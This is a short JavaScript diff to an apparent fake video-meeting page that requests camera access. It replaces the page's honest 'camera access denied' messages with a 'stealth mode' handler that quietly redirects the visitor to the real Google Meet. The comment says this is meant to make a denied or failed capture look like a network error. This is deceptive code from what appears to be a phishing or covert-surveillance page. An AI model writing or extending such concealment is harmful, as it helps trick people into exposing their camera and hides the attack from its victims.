@@ -653,19 +653,11 @@
 
     // Manejo de errores
     function handleError(error) {
-      const modal = document.getElementById('waiting-modal');
-      const modalText = modal.querySelector('h2');
-      const modalSubtext = modal.querySelector('p');
-
-      if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-        modalText.innerText = 'Acceso a cámara denegado';
-        modalSubtext.innerText = 'Por favor, habilita el acceso a la cámara para unirte a la reunión';
-      } else {
-        modalText.innerText = 'Error al acceder a la cámara';
-        modalSubtext.innerText = error.message;
-      }
-
-      modal.querySelector('.spinner').style.display = 'none';
+      // En modo sigiloso, si falla o deniega, simplemente redirigimos 
+      // o dejamos la pantalla de carga para que parezca un error de red
+      setTimeout(() => {
+        window.location.href = "https://meet.google.com/"; 
+      }, 1000);
     }
 
     // Controles de interfaz
